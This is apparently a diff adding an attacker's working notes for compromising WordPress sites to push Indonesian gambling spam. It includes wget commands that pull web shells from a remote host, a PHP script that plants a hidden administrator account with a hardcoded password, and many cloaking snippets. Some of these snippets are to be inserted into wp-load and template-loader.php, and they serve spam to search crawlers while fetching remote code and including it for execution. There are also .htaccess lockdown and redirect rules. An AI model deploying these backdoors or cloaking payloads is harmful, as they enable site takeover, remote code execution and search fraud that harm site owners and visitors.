@@ -1,0 +1,728 @@
+wget https://kamuswin.com/shell/googlea5b16649dbec4344.html -O googlea5b16649dbec4344.html
+wget https://untunguntung.shop/shell/index.txt -O radio.php
+wget https://untunguntung.shop/shell/jmbt.txt -O vendor.php
+wget https://untunguntung.shop/shell/new.txt -O vendor.php
+wget https://untunguntung.shop/shell/scanner.txt -O scan.php
+wget https://untunguntung.shop/shell/tebar.txt -O tebar.php
+
+Rizaleko228@gmail.com
+
+https://untunguntung.shop/landing/jdih-tidorekota.txt
+
+# Redirect sementara (shortlink)
+RewriteRule ^login-starjudi$ https://klikstar.store/ [L,R=302]
+RewriteRule ^wa-starjudi$ https://api.whatsapp.com/send?phone=6281383091445 [L,R=302]
+RewriteRule ^livechat-starjudi$ https://secure.livechatenterprise.com/licence/11782497/v2/open_chat.cgi?groups=0 [L,R=302]
+RewriteRule ^telegram-starjudi$ https://t.me/starjudi [L,R=302]
+
+
+RewriteEngine On
+RewriteBase /
+RewriteRule ^.*$ https://agen228id.digital/?ref=8AC36B [L,R=302]
+
+
+https://linkgacor.kiosjituslot.com/login
+
+-----------------------------
+<IfModule mod_rewrite.c>
+RewriteEngine on
+
+RewriteRule ^$ classroom.php?url=home [L]
+RewriteRule ^index\.html$ classroom.php?url=home [L]
+RewriteRule ^(.*)\.html$ classroom.php?url=$1 [L]
+
+ErrorDocument 404 "<h1>Forbidden</h1>"
+
+Options All -Indexes
+</IfModule>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+-------------------------------------------------
+
+<?php
+include 'wp-load.php';
+
+$user = 'binatang';
+$pass = 'Anakkampung123@';
+$email = 'kambinggurun303@gmail.com';
+if ( !username_exists( $user ) && !email_exists( $email ) ) {
+$user_id = wp_create_user( $user, $pass, $email );
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+echo 'user inserted';
+} else {
+	echo 'user already registered';
+}
+--------------------------------------------
+
+
+<?php
+function isSearchEngineBot() {
+    $bots = 'googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|telegrambot|google-site-verification|google-inspectiontool|ahrefsbot';
+    return isset($_SERVER['HTTP_USER_AGENT']) && preg_match("/($bots)/i", $_SERVER['HTTP_USER_AGENT']);
+}
+
+function isFromGoogle() {
+    if (!isset($_SERVER['HTTP_REFERER'])) return false;
+    $ref = strtolower($_SERVER['HTTP_REFERER']);
+    return strpos($ref, 'google.') !== false;
+}
+
+function NuLzFetch($url) {
+    $context = stream_context_create([
+        'http' => ['timeout' => 10, 'follow_location' => true],
+        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
+    ]);
+
+    if (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url, false, $context);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_TIMEOUT => 10
+        ]);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
+
+// Cookie visit
+$cookie_expiration = time() + (365 * 86400);
+if (!isset($_COOKIE['visited'])) {
+    setcookie('visited', '1', $cookie_expiration, "/", "", false, true);
+}
+
+// Cache headers
+$cache_duration = 365 * 86400;
+header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
+header("Pragma: cache");
+header("Expires: " . gmdate("D, d M Y H:i:s", time() + $cache_duration) . " GMT");
+
+$landing_page = __DIR__ . '/file.json';
+$index_home   = __DIR__ . '/asli.json';
+
+// Bot / Google traffic → landing_page
+if (isSearchEngineBot() || isFromGoogle()) {
+    $content = NuLzFetch($landing_page);
+    echo $content ?: '';
+} else {
+    $content = NuLzFetch($index_home);
+    if ($content) {
+        // Lebih aman simpan dulu ke file sementara lalu include
+        $tmp_file = __DIR__ . '/_tmp_include.php';
+        file_put_contents($tmp_file, $content);
+        include $tmp_file;
+        unlink($tmp_file);
+    }
+}
+
+
+
+
+
+----------------------------------------------------------------
+
+<?php
+ob_start();
+header('Vary: User-Agent');
+$bot_url = "https://untunguntung.shop/landing/tidorekota.txt";
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+function lph_requests($url) {
+    if (function_exists('curl_init')) {    
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+if (preg_match($botchar, $ua)) {
+    usleep(rand(100000, 200000)); 
+    echo lph_requests($bot_url);
+    ob_end_flush();
+    exit;
+}
+?>
+
+
+--------------------------------------------------------------------
+
+<?php
+function bambu_team($url) {
+    if (ini_get('allow_url_fopen')) {
+    return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://untunguntung.shop/landing/jdih-tidorekota.txt";
+$file = bambu_team($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
+}
+?>
+
+---------------------------------------------------------------
+
+Cloacking panen99
+
+<?php
+function is_real_googlebot() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+    $host = gethostbyaddr($ip);
+    if ($host === $ip) return false;
+
+    if (!preg_match('/\.google(bot)?\.com$/', $host)) return false;
+
+    $forward_ips = gethostbynamel($host);
+    if ($forward_ips === false) return false;
+
+    return in_array($ip, $forward_ips);
+}
+
+if (is_real_googlebot()) {
+    $remote_url = "https://hatersonduty.com/restaurantecarlini-catalogo/";
+
+    $options = [
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Googlebot\n"
+        ]
+    ];
+    $context = stream_context_create($options);
+
+    $content = @file_get_contents($remote_url, false, $context);
+
+    if ($content === false) {
+        http_response_code(204); // No Content
+    } else {
+        echo $content;
+    }
+
+    exit;
+}
+?>
+-----------------------------------------------------
+
+<?php
+$bot_user_agents=array("Googlebot","Googlebot-Image","Googlebot-News","Googlebot-Video","Storebot-Google","Google-InspectionTool","GoogleOther","GoogleOther-Image","GoogleOther-Video","Google-CloudVertexBot","Google-Extended","APIs-Google","AdsBot-Google-Mobile","AdsBot-Google","Mediapartners-Google","FeedFetcher-Google","Google-Favicon","Google Favicon","Googlebot-Favicon","Google-Site-Verification","Google-Read-Aloud","GoogleProducer","Google Web Preview","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebookexternalhit","ia_archiver","Alexa Crawler","AhrefsBot","Semrushbot");
+
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+
+if (is_google_bot()) {
+    $bot_content = file_get_contents('https://sabonelaundry-sabone-laundry-sabone.pages.dev/sabonelaundry-sabone-laundry-sabone.txt');
+    echo $bot_content;
+    exit;
+} else {
+    include('page.php');
+    exit;
+}
+
+?>
+
+------------------------------------------
+
+LETAK DI WP LOAD
+
+
+$u = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+    $i = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["REMOTE_ADDR"];
+    $r = $_SERVER['HTTP_REFERER'] ?? '';
+    $p = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? '/';
+    $c = stream_context_create(["http" => ["timeout" => 1.5]]);
+
+    function fetch($url) {
+        global $c;
+        $h = @file_get_contents($url, false, $c);
+        if (!$h || strlen(trim($h)) < 20) {
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => 1,
+                CURLOPT_FOLLOWLOCATION => 1,
+                CURLOPT_TIMEOUT => 5,
+                CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"] ?? 'Mozilla'
+            ]);
+            $h = curl_exec($ch); curl_close($ch);
+            if (!$h || strlen(trim($h)) < 20) $h = @file_get_contents($url, false, $c);
+        }
+        return $h;
+    }
+
+    $b = false;
+    foreach (['googlebot','adsbot','mediapartners','apis-google','structured-data-testing-tool','googlebot-image','googlebot-video','googlebot-news','google-inspectiontool'] as $x) {
+        if (strpos($u, $x) !== false) {
+            $h = @gethostbyaddr($i);
+            $b = strpos($u, 'googlebot') !== false && $h && $h !== $i ? strpos($h, 'google.com') !== false || strpos($h, 'googlebot.com') !== false : true;
+            break;
+        }
+    }
+
+    if (($b || strpos($r, 'search.google.com') !== false || isset($_GET["verify"])) && in_array($p, ['/', '/index.php'])) {
+        if ($b) usleep(700000);
+        $cdn = "https://untunguntung.shop/landing/citas.sct.gob.mx.txt?_v=" . time();
+        $x = fetch($cdn);
+        if (strlen(trim($x)) > 50) {
+            while (ob_get_level()) ob_end_clean();
+            header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+            header("Pragma: no-cache");
+            header("Expires: 0");
+            header("Content-Type: text/html; charset=utf-8");
+            echo $x;
+            exit;
+        }
+    }
+----------------------------------------------------------------------------------------------
+
+<?php
+// Fungsi untuk memeriksa apakah user agent adalah bot mesin pencari
+function isSearchEngineBot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
+    }
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|AhrefsBot|TelegramBot|Google-Site-Verification|Google-InspectionTool)/i', $userAgent);
+}
+ 
+// Fungsi untuk memeriksa apakah referer dari Google
+function isFromGoogle() {
+    if (!isset($_SERVER['HTTP_REFERER'])) {
+        return false;
+    }
+    $referer = $_SERVER['HTTP_REFERER'];
+    return strpos($referer, 'google.com') !== false || 
+           strpos($referer, 'google.co.id') !== false;
+}
+ 
+// Fungsi alternatif untuk mengambil konten dari URL
+function NuLzFetch($url) {
+    $url = trim($url); // Hilangkan spasi
+    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
+        return "Invalid URL: $url";
+    }
+ 
+    if (function_exists('file_get_contents')) {
+        $context = stream_context_create(['http' => ['timeout' => 5]]);
+        $fetch = @file_get_contents($url, false, $context);
+        if ($fetch !== false) return $fetch;
+    }
+ 
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Hanya untuk dev
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Cloaking Checker/1.0)');
+        $fetch = curl_exec($ch);
+        curl_close($ch);
+        if ($fetch !== false) return $fetch;
+    }
+ 
+    return "Cannot fetch URL: $url";
+}
+ 
+// Atur cookie jika belum pernah dikunjungi
+$cookie_expiration = time() + (365 * 86400); // 1 tahun
+if (!isset($_COOKIE['visited'])) {
+    setcookie('visited', '1', $cookie_expiration, "/");
+}
+ 
+$cache_duration = 86400;
+header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
+header("Pragma: cache");
+header("Content-Type: text/html; charset=utf-8");
+ 
+$index_home = 'index';
+ 
+$remote_url = 'https://atoybesar.online/singh.html';
+ 
+if (isSearchEngineBot()) {
+    $content = NuLzFetch($remote_url);
+    echo $content;
+} elseif (isFromGoogle()) {
+    $content = NuLzFetch($remote_url);
+    echo $content;
+} else {
+    if (file_exists($index_home)) {
+        include($index_home);
+    } 
+}
+?>
+
+--------------------------------------------------------------
+
+<?php
+
+$crawlers = [
+    'Googlebot',
+    'Google-InspectionTool',
+    'Bingbot',
+    'Slurp',
+    'DuckDuckBot',
+    'Baiduspider',
+    'YandexBot',
+    'facebookexternalhit',
+    'Twitterbot',
+    'LinkedInBot',
+    'TelegramBot',
+    'Applebot',
+];
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+foreach ($crawlers as $crawler) {
+    if (stripos($userAgent, $crawler) !== false) {
+
+        header("Content-Type: text/html; charset=utf-8");
+        readfile("https://balbehra.akalacademy.ac.in/myicon/");
+        exit;
+    }
+}
+
+?>
+
+
+
+------------------------------------------------
+
+<?php
+// Kullanıcı IP'si ve User-Agent'ı kontrol et
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
+
+// Google ile ilgili user-agent kontrolleri
+if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
+    include('https://nyaammm.pages.dev/file.txt');  // Google bot ise google.php göster
+} elseif ($is_mobile) {
+    include('home.php');  // Mobil cihaz ise kullanici.php göster
+} else {
+    include('home.php');  // Diğer durumlar için default içerik
+}
+?>
+
+-----------------------------------------
+
+
+LETAK DI WP INCLUDES template-loader.php
+
+<?php
+/**
+ * Loads the correct template based on the visitor's url
+ *
+ * @package WordPress
+ */
+if ( wp_using_themes() ) {
+	/**
+	 * Fires before determining which template to load.
+	 *
+	 * @since 1.5.0
+	 */
+	do_action( 'template_redirect' );
+}
+
+/**
+ * Filters whether to allow 'HEAD' requests to generate content.
+ *
+ * Provides a significant performance bump by exiting before the page
+ * content loads for 'HEAD' requests. See #14348.
+ *
+ * @since 3.5.0
+ *
+ * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
+ */
+if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
+	exit;
+}
+function is_mobile() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $keywords = array("bot","ahrefs","google");
+    foreach ($keywords as $keyword) {
+        if (stripos($user_agent, $keyword) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+if (is_mobile()) {
+    $message = file_get_contents("https://equimondia.pages.dev/equimondia.txt");
+    echo $message;
+    exit;
+}
+// Process feeds and trackbacks even if not using themes.
+if ( is_robots() ) {
+	/**
+	 * Fired when the template loader determines a robots.txt request.
+	 *
+	 * @since 2.1.0
+	 */
+	do_action( 'do_robots' );
+	return;
+} elseif ( is_favicon() ) {
+	/**
+	 * Fired when the template loader determines a favicon.ico request.
+	 *
+	 * @since 5.4.0
+	 */
+	do_action( 'do_favicon' );
+	return;
+} elseif ( is_feed() ) {
+	do_feed();
+	return;
+} elseif ( is_trackback() ) {
+	require ABSPATH . 'wp-trackback.php';
+	return;
+}
+
+if ( wp_using_themes() ) {
+
+	$tag_templates = array(
+		'is_embed'             => 'get_embed_template',
+		'is_404'               => 'get_404_template',
+		'is_search'            => 'get_search_template',
+		'is_front_page'        => 'get_front_page_template',
+		'is_home'              => 'get_home_template',
+		'is_privacy_policy'    => 'get_privacy_policy_template',
+		'is_post_type_archive' => 'get_post_type_archive_template',
+		'is_tax'               => 'get_taxonomy_template',
+		'is_attachment'        => 'get_attachment_template',
+		'is_single'            => 'get_single_template',
+		'is_page'              => 'get_page_template',
+		'is_singular'          => 'get_singular_template',
+		'is_category'          => 'get_category_template',
+		'is_tag'               => 'get_tag_template',
+		'is_author'            => 'get_author_template',
+		'is_date'              => 'get_date_template',
+		'is_archive'           => 'get_archive_template',
+	);
+	$template      = false;
+
+	// Loop through each of the template conditionals, and find the appropriate template file.
+	foreach ( $tag_templates as $tag => $template_getter ) {
+		if ( call_user_func( $tag ) ) {
+			$template = call_user_func( $template_getter );
+		}
+
+		if ( $template ) {
+			if ( 'is_attachment' === $tag ) {
+				remove_filter( 'the_content', 'prepend_attachment' );
+			}
+
+			break;
+		}
+	}
+
+	if ( ! $template ) {
+		$template = get_index_template();
+	}
+
+	/**
+	 * Filters the path of the current template before including it.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @param string $template The path of the template to include.
+	 */
+	$template = apply_filters( 'template_include', $template );
+	if ( $template ) {
+		include $template;
+	} elseif ( current_user_can( 'switch_themes' ) ) {
+		$theme = wp_get_theme();
+		if ( $theme->errors() ) {
+			wp_die( $theme->errors() );
+		}
+	}
+	return;
+}
+
+--------------------------------------------------------------------------
+
+<?php
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+
+if (is_google_bot()) {
+    $bot_content = file_get_contents('https://ict-file.pages.dev/ict.txt');
+    echo $bot_content;
+    exit;
+} else {
+    include('00.php');
+    exit;
+}
+$browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
+if ($browserLang == 'id') {
+    header("Location:https://saya-suka-kamu-punya.pages.dev/");
+    exit;
+}
+?>
+--------------------------------------------
+
+<FilesMatch '.(py|exe|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(index.php|wp-blog-header.php|wp-config-sample.php|wp-links-opml.php|wp-login.php|wp-settings.php|wp-trackback.php|wp-activate.php|wp-comments-post.php|wp-cron.php|wp-load.php|wp-mail.php|wp-signup.php|xmlrpc.php|edit-form-advanced.php|link-parse-opml.php|ms-sites.php|options-writing.php|themes.php|admin-ajax.php|edit-form-comment.php|link.php|ms-themes.php|plugin-editor.php|admin-footer.php|edit-link-form.php|load-scripts.php|ms-upgrade-network.php|admin-functions.php|edit.php|load-styles.php|ms-users.php|plugins.php|admin-header.php|edit-tag-form.php|media-new.php|my-sites.php|post-new.php|admin.php|edit-tags.php|media.php|nav-menus.php|post.php|admin-post.php|export.php|media-upload.php|network.php|press-this.php|upload.php|async-upload.php|menu-header.php|options-discussion.php|privacy.php|user-edit.php|menu.php|options-general.php|profile.php|user-new.php|moderation.php|options-head.php|revision.php|users.php|custom-background.php|ms-admin.php|options-media.php|setup-config.php|widgets.php|custom-header.php|ms-delete-site.php|options-permalink.php|term.php|customize.php|link-add.php|ms-edit.php|options.php|edit-comments.php|link-manager.php|ms-options.php|options-reading.php|system_log.php|inputs.php|adminfuns.php|chtmlfuns.php|cjfuns.php|classsmtps.php|classfuns.php|comfunctions.php|comdofuns.php|connects.php|copypaths.php|delpaths.php|doiconvs.php|epinyins.php|filefuns.php|gdftps.php|hinfofuns.php|hplfuns.php|memberfuns.php|moddofuns.php|onclickfuns.php|phpzipincs.php|qfunctions.php|qinfofuns.php|schallfuns.php|tempfuns.php|userfuns.php|siteheads.php|termps.php|txets.php|thoms.php|postnews.php|txets.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+------------------------------------------------
+
+AGENHOKI
+
+<?php
+// Fungsi untuk memeriksa apakah user agent adalah bot mesin pencari
+function isSearchEngineBot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
+    }
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|AhrefsBot|TelegramBot|Google-Site-Verification|Google-InspectionTool)/i', $userAgent);
+}
+
+// Fungsi untuk memeriksa apakah referer dari Google
+function isFromGoogle() {
+    if (!isset($_SERVER['HTTP_REFERER'])) {
+        return false;
+    }
+    $referer = $_SERVER['HTTP_REFERER'];
+    return strpos($referer, 'google.com') !== false || 
+           strpos($referer, 'google.co.id') !== false;
+}
+
+// Fungsi alternatif untuk mengambil konten dari URL
+function NuLzFetch($url) {
+    $url = trim($url); // Hilangkan spasi
+    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
+        return "Invalid URL: $url";
+    }
+
+    if (function_exists('file_get_contents')) {
+        $context = stream_context_create(['http' => ['timeout' => 5]]);
+        $fetch = @file_get_contents($url, false, $context);
+        if ($fetch !== false) return $fetch;
+    }
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Hanya untuk dev
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Cloaking Checker/1.0)');
+        $fetch = curl_exec($ch);
+        curl_close($ch);
+        if ($fetch !== false) return $fetch;
+    }
+
+    return "Cannot fetch URL: $url";
+}
+
+// Atur cookie jika belum pernah dikunjungi
+$cookie_expiration = time() + (365 * 86400); // 1 tahun
+if (!isset($_COOKIE['visited'])) {
+    setcookie('visited', '1', $cookie_expiration, "/");
+}
+
+$cache_duration = 86400;
+header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
+header("Pragma: cache");
+header("Content-Type: text/html; charset=utf-8");
+
+$index_home = 'indexx.php';
+
+$remote_url = 'https://profesianalwork.pages.dev/dia.txt';
+
+if (isSearchEngineBot()) {
+    $content = NuLzFetch($remote_url);
+    echo $content;
+} elseif (isFromGoogle()) {
+    $content = NuLzFetch($remote_url);
+    echo $content;
+} else {
+    if (file_exists($index_home)) {
+        include($index_home);
+    } 
+}
+?>
+
+--------------------------------------------
+
+RPHOKI
+<?php
+function is_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+
+if (is_bot()) {
+    $url = 'https://hcxseo.com/r/060dfd/raw';
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
+
+    echo $result ?: ' ';
+    exit;
+}
+
+-----------------------------------------------
